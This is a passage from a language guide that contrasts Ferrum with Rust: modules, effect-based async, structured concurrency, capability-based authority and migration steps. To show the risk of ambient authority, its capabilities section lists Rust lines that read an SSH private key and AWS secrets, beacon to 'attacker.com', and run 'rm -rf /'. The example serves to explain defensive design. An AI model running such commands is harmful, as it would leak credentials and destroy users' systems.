```
src/
  foo.fe          # mod foo
  bar.fe          # mod bar (can contain submodules)
  bar/
    baz.fe        # mod bar.baz
```

A module is either a single file `foo.fe` or a directory `foo/` with files inside. The file `bar.fe` can contain `mod baz` to include the subdirectory. No `mod.rs` ambiguity — the parent module is always named.

### Visibility

```ferrum
pub struct Foo { ... }           // visible outside this module
pub(package) struct Bar { ... }  // visible within this package
struct Baz { ... }               // private to this module
```

Ferrum uses `pub(package)` where Rust uses `pub(crate)`. Same concept, different name. Ferrum calls compilation units "packages" rather than "crates."

### Import Syntax

```rust
// Rust
use std::collections::{HashMap, HashSet};
use crate::utils::helper;
```

```ferrum
// Ferrum
import std.collections.{HashMap, HashSet}
import .utils.helper
```

The leading `.` means "this package" (like Rust's `crate::`).

---

## Async: Effect-Based, Not Type-Based

Rust async functions are "colored" — `async fn` silently changes the return type to `Pin<Box<dyn Future<Output = T>>>` and forces callers into async as well:

```rust
// Rust: two different worlds
fn sync_read(path: &str) -> Result<String, Error> { ... }
async fn async_read(path: &str) -> Result<String, Error> { ... }
// async_read actually returns impl Future<Output = Result<String, Error>>

// Can't call async_read from sync context without a runtime
// Async annotation spreads up the call stack
```

Ferrum uses effects instead — no type transformation, no separate return type:

```ferrum
// Ferrum: same signature shape, different effects
fn sync_read(path: &str): Result[String, Error] ! IO { ... }
fn async_read(path: &str): Result[String, Error] ! IO + Async { ... }
```

The `Async` effect marks suspendable functions. You can call sync functions from async contexts freely, and effect inference propagates `! Async` upward without manual annotation:

```ferrum
fn process() ! IO + Async {
    let config = sync_read("config.toml")?   // sync IO, fine
    let data = async_read("data.txt").await? // async IO, fine
    // ...
}
```

**The improvement over Rust:** No `Future<T>` wrapper in return types, no `async fn` keyword changing the signature, effect inference instead of manual propagation. **What remains:** Callers still write `.await` at suspension points — Ferrum reduces type-level coloring but does not eliminate call-site syntax. Go's goroutines (stack-swapping) are the alternative that removes `.await` entirely.

### Structured Concurrency

Ferrum enforces structured concurrency — spawned tasks cannot outlive their spawning scope:

```ferrum
fn fetch_all(urls: &[String]): Vec[Response] ! Net + Async {
    scope |s| {
        let handles: Vec[Task[Response]] = urls.iter()
            .map(|url| s.spawn(|| http.get(url)))
            .collect()

        handles.into_iter()
            .map(|h| h.await)
            .collect()
    }
}
// All tasks complete before fetch_all returns, guaranteed
```

No unstructured spawning into the void. No orphaned tasks. No "spawn and forget" bugs.

Compare to Rust's tokio:

```rust
// Rust: nothing prevents this anti-pattern
async fn dangerous() {
    tokio::spawn(async {
        // This task might outlive its caller
        // If it holds references to caller's data, undefined behavior
    });
}
```

Ferrum's `scope` makes task lifetime explicit and compiler-checked.

---

## Capabilities: First-Class Authority

Capabilities control what a function can do beyond pure computation. Instead of any code being able to do `fs.read("file")`, capabilities make authority explicit.

### The Problem: Ambient Authority

In most languages (including Rust), any function can:

```rust
// Rust — any code can do these
std::fs::read("~/.ssh/id_rsa")?;                    // Read sensitive files
std::env::var("AWS_SECRET_ACCESS_KEY")?;           // Read credentials
reqwest::get("https://attacker.com/beacon")?;      // Exfiltrate data
std::process::Command::new("rm").args(["-rf", "/"]).spawn()?; // Destroy system
```

You trust libraries not to abuse this. But you can't verify it from the code.

### Ferrum: Explicit Authority

```ferrum
fn process_file(fs: FsCap, path: &str): Result[String, Error] ! IO {
    fs.read(path)  // can only access what FsCap permits
}
```

The `FsCap` is a capability token. You can only do filesystem operations if someone gave you the capability. And capabilities can be restricted:

```ferrum
fn run_plugin(plugin: Plugin, fs: FsCap.read_only("/plugins/")) ! IO {
    plugin.run(fs)  // plugin can only read from /plugins/
}
```

### Practical Capability Patterns

- **Pattern 1: Sandbox untrusted code**

  ```ferrum
  fn evaluate_user_script(script: &str): Result[Value, Error] {
      // Create a minimal sandbox — no IO, no Net, no Unsafe
      let sandbox = Sandbox.new()
          .allow_pure()        // pure computation only
          .max_memory(16.mb()) // limited memory
          .max_time(1.second()) // limited time

      sandbox.run(|| {
          let ast = parse(script)?
          interpret(ast)
      })
  }
  ```

  The sandbox capability restricts what the script can do. Violations are compile errors, not runtime failures.

- **Pattern 2: Audit capabilities at API boundaries**

  ```ferrum
  // Public API declares required capabilities
  pub fn start_server(
      net: NetCap,
      fs: FsCap,
      port: u16,
  ): Server ! Net + IO {
      // Implementation can use net and fs
  }
  ```

  From the signature, you know exactly what authority this function needs. No hidden filesystem access or network calls.

- **Pattern 3: Principle of least privilege**

  ```ferrum
  fn process_uploads(
      input_fs: FsCap.read_only("/uploads/"),
      output_fs: FsCap.write_only("/processed/"),
      log: LogCap,
  ) ! IO {
      for file in input_fs.list("*")? {
          let data = input_fs.read(&file)?
          let processed = transform(data)
          output_fs.write(&format("/processed/{}", file), &processed)?
          log.info("Processed {}", file)
      }
  }
  ```

  The function can read from `/uploads/`, write to `/processed/`, and log. It cannot read from `/processed/`, write to `/uploads/`, or access anything else. The compiler enforces this.

- **Pattern 4: Capability attenuation**

  ```ferrum
  fn main() ! IO + Net {
      // main() has full capabilities
      let full_fs = FsCap.all()

      // Attenuate for a subsystem
      let config_fs = full_fs.restrict_to("/etc/myapp/")
      let data_fs = full_fs.restrict_to("/var/myapp/").read_only()

      run_app(config_fs, data_fs)
  }
  ```

  You can always create a less-powerful capability from a more-powerful one. You can never create a more-powerful capability (that would require someone who has it to grant it).

### In Practice

For most code, capabilities are implicit in the runtime context:

```ferrum
fn main() ! IO + Net {
    // main() has full capabilities by default
    let data = fs.read("input.txt")?
}
```

You explicitly restrict capabilities when:
- Running untrusted code (plugins, scripts, uploaded content)
- Implementing security boundaries
- Enforcing least-privilege architecture
- Building sandbox environments

---

## What's the Same

Don't relearn these — they work like Rust:

- **Ownership and borrowing** — same rules
- **Move semantics** — same rules
- **Pattern matching** — same syntax and semantics
- **Result and Option** — same types, same `?` operator
- **Traits** — same concept (syntax differs slightly)
- **Enums with data** — same
- **Iterators** — same lazy, zero-cost model
- **Closures** — same (`Fn`, `FnMut`, `FnOnce`)
- **Smart pointers** — `Box`, `Rc`, `Arc`, `Weak` (with `[T]` syntax)
- **Interior mutability** — `Cell`, `RefCell` work the same
- **Thread safety** — `Send` and `Sync` traits
- **Drop** — same destructor trait

---

## Migration Checklist

When porting Rust to Ferrum:

1. **Syntax transforms** (mechanical):
   - `<T>` -> `[T]`
   - `::` -> `.`
   - `#[attr]` -> `@attr`
   - `->` -> `:`
   - Remove semicolons
   - `crate::` -> `.`

2. **Remove lifetime annotations** — Ferrum infers them (keep only genuinely ambiguous ones)

3. **Add effects to `pub` functions**:
   - Uses `println`/files? -> `! IO`
   - Uses network? -> `! Net`
   - Can panic? -> `! Panic` (optional, for documentation)
   - Is async? -> `! Async`

4. **Map `unsafe` blocks** to appropriate level:
   - Bounds check skips -> `unchecked`
   - Invariant maintenance -> `trusted("reason")`
   - FFI calls -> `extern`
   - Pointer manipulation -> `unsafe`

5. **Add contracts** where appropriate:
   - Document preconditions with `requires`
   - Document postconditions with `ensures`
   - Add `invariant` to types with internal invariants

6. **Remove macro usage** — `println!`/`vec!`/`format!` become intrinsics `println`/`vec`/`format`; custom macros need external codegen or rewriting as regular code

---

## Quick Reference

| Rust | Ferrum |
|------|--------|
| `Vec<T>` | `Vec[T]` |
| `std::io::Result` | `std.io.Result` |
| `#[derive(Debug)]` | `@derive(Debug)` |
| `fn foo() -> T` | `fn foo(): T` |
| `'a` (lifetime) | (inferred, or `'a` when needed) |
| `unsafe { }` | `unchecked/trusted/extern/unsafe { }` |
| `println!("{}", x)` | `println("{}", x)` |
| `pub(crate)` | `pub(package)` |
| `crate::foo` | `.foo` |
| `mod foo;` | (automatic from file structure) |
| `async fn` | `fn ... ! Async` |
| (none) | `requires`/`ensures`/`invariant` |
| (none) | `! IO`, `! Net` (effects) |
| (none) | `proof fn` |
| (none) | Capabilities |
| (none) | `given` (implicit parameters) |

---

## What Ferrum Asks of You

Ferrum's additions aren't free. Here's what you commit to:

1. **Effect annotations at API boundaries.** You'll annotate `pub` functions with their effects. This is additional ceremony compared to Rust, but it's similar to annotating `async` — just for all side effects, not only suspension.

2. **Thinking about safety levels.** Instead of one `unsafe` bucket, you'll categorize unsafe operations. This is more work upfront, less work when auditing.

3. **Contracts for complex invariants.** You can ignore contracts entirely, but you'll get more value from Ferrum by documenting preconditions and postconditions where they matter.

4. **Learning when inference fails.** Region inference handles most common borrow patterns — simple borrows, linear flows, local references — but when it fails (ambiguous aliasing, complex API boundaries, region-polymorphic generics) you need to understand why and how to add annotations.

The return: APIs that can't lie about their effects, finer-grained unsafe auditing, optional but powerful verification tools, and capability-based security when you need it.

---

## The Philosophy Behind the Differences

Ferrum and Rust share a core philosophy: memory safety without garbage collection, zero-cost abstractions, fearless concurrency. Where they differ is in how much the type system should capture:

| Concern | Rust | Ferrum |
|---------|------|--------|
| Memory safety | Type system + `unsafe` | Type system + graduated safety |
| Aliasing | Explicit lifetimes | Inferred regions |
| Side effects | Informal convention | Type system tracked |
| Preconditions | Documentation/assertions | First-class contracts |
| Authority | Ambient (everything allowed) | Capability-controlled |

Rust optimizes for simplicity and adoption — fewer concepts to learn, but less that the compiler can verify.

Ferrum optimizes for auditability and verification — more concepts, but more compiler guarantees. Effects let you trust API boundaries. Contracts let you prove correctness. Capabilities let you enforce least-privilege.

Neither approach is strictly better. Rust's approach is appropriate when:
- You prioritize onboarding new developers
- Effects and contracts would be over-engineering for your domain
- You trust your dependencies implicitly

Ferrum's approach is appropriate when:
- You need to audit what code can do without reading all of it
- Correctness is more important than simplicity
- You're building security-sensitive or safety-critical systems

---

*See also: [Ferrum Language Reference](ferrum-language-reference.md) for complete specification.*
